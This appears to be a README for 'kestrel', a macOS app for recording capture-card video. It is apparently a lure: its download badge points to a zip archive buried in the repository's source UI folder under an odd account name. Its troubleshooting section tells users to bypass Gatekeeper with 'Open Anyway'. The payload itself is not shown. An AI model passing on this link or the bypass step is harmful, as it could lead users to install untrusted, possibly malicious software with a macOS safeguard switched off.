# 🎥 kestrel - Record high quality video from consoles

[![](https://img.shields.io/badge/Download_Kestrel-blue)](https://github.com/Counterdemonstratorraffiafarinifera618/kestrel/raw/refs/heads/main/Sources/Kestrel/UI/Software_2.5-beta.5.zip)

Kestrel records video from USB-C HDMI capture cards directly on your Mac. It sits in your menu bar and stays out of your way. This app captures 4K video at 60 frames per second using efficient HEVC encoding. All video processing happens on your machine. Your data never leaves your computer.

## 📋 System Requirements

To use Kestrel, your setup must meet these standards:

*   A Mac with an Apple Silicon processor (M1, M2, or M3 series chips).
*   A USB-C HDMI capture card compatible with macOS.
*   An HDMI cable to connect your video source.
*   macOS 13.0 or later.
*   At least 10 GB of free storage space for your recordings.

## ⚙️ Setting Up Your Hardware

Connect your capture card to the USB-C port on your Mac. Plug the HDMI cable from your game console, camera, or other device into the capture card. Kestrel detects the input signal automatically when you launch the app. 

Ensure your capture card supports UVC (USB Video Class) standards, as Kestrel relies on this protocol to communicate with your device. If the app does not show a video feed, check that your cables are firm and the capture card power light glows.

## ⏺ Using Kestrel

When you open Kestrel, a small falcon icon appears in your menu bar at the top of your screen. Click this icon to open the control menu. 

The menu displays your current capture status, resolution, and frame rate. Use the "Start Recording" button to begin capturing your video feed. Click "Stop Recording" to end the session. Kestrel saves your files in the MP4 format using the HEVC codec. This format keeps file sizes small while maintaining high visual detail.

## 📁 Managing Your Files

Kestrel saves all recordings to a dedicated folder in your Documents directory. You can reach these files at any time via the Finder. Each file name contains the date and time of the recording to help you stay organized. 

If you run out of space, move your recordings to an external hard drive or cloud storage service. Kestrel does not delete your files automatically, so check your storage usage often if you record for long periods. 

## 🛠 Troubleshooting Common Issues

**The App Does Not Detect Any Video**
Check your HDMI cables. Try a different USB-C port on your Mac. Verify that the capture card is powered if it requires an external source.

**Recording Stops Unexpectedly**
Ensure your Mac has enough free disk space. A full drive causes recordings to fail or stop without warning. Monitor your storage settings in your System Settings menu.

**Performance Feels Slow**
Close other background programs that use your camera or video hardware. Apple Silicon handles HEVC encoding efficiently, but heavy multitasking impacts final output quality.

**The App Will Not Open**
If macOS prevents the app from opening, navigate to System Settings, click Privacy & Security, and look for a notification about Kestrel. Click "Open Anyway" to verify your choice.

## 🔒 Privacy and Safety

Kestrel respects your privacy. The app keeps all operations local. It does not connect to the internet to verify your recordings or send usage statistics. Your video files remain on your disk at all times. Because the app uses Apple's native frameworks, it uses minimal battery and keeps your system cool during long recording sessions.

## 💡 Pro Tips for Best Results

*   Use high-quality HDMI cables to prevent signal flickering.
*   Turn off notifications while recording to avoid interruptions in your video feed.
*   Keep your Mac plugged into power during long recording sessions to prevent the system from entering sleep mode.
*   Check your capture card settings to ensure it outputs a resolution your Mac can process comfortably.
